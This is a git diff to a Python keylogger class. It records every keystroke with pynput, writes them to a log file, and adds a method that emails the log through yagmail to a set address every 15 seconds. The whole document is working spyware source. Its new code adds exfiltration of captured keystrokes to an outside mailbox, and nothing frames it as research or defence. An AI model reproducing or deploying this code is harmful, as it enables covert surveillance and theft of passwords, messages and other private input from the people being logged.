@@ -2,6 +2,8 @@ from pynput.keyboard import Key, Listener # used to listen to keystrokes
 import logging, time, yagmail  # import used to log, get elapsed time, and send emails
 from logging.handlers import TimedRotatingFileHandler # used to rotate logs 
 
+log_flush = 10
+email_send = 15
 
 class KeyLogger:
     """
@@ -14,13 +16,19 @@ class KeyLogger:
     mem: string buffer to minimize logging writeouts
     start_time: time of the current logging cycle
     """
-    def __init__(self, email="default@gmail.com", log_dir=""):
+    def __init__(self, email="", log_dir=""):
+        # email
         self.to_email = email
-        self.log_email = "@gmail.com"
+        self.log_email = ""
+
+        # buffer
         self.mem = []
         self.start_time = time.time()
-        yag = yagmail.SMTP(self.log_email)
-        logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.INFO, format='%(asctime)s: %(message)s')
+        self.email_time = self.start_time
+        
+        # logging 
+        self.filename = "key_log.txt"
+        logging.basicConfig(filename=(log_dir + self.filename), level=logging.INFO, format='%(asctime)s: %(message)s')
 
     def run_keylogger(self):
         """
@@ -43,16 +51,35 @@ class KeyLogger:
         """
         Action taken on keyboard press
         """
-        self.mem.append(str(key))
+        c = str(key).replace("'", "")
+        self.mem.append(c)
         # log the data, update time and flush buffer
-        if self.__decide_flush(key):
+        if self.__check_time(log_flush, self.start_time):
             logging.info("".join(self.mem))
             self.mem.clear() 
             self.start_time = time.time()
+        
+        # check to see if it's time to email
+        if self.__check_time(email_send, self.email_time):
+            self.send_email()
+            self.email_time = time.time()
+            # rollover the log
     
-    def __decide_flush(self, key):
+    def send_email(self):
         """
-        private function used to decide if appropriate to flush buffer
+        Sends email to email to the log email specified in the program
         """
-        return True if time.time() - self.start_time >= 10.0 else False
+        yag = yagmail.SMTP(self.log_email)
+        yag.send(
+            to=self.to_email,
+            subject="Current Log ru",
+            contents="Please see the attached document for keystrokes in the past 2 minutes", 
+            attachments=self.filename,
+        )
+
+    def __check_time(self, check, curr_time):
+        """
+        private function used to decide if appropriate to continue based on time
+        """
+        return True if time.time() - curr_time >= check else False
     
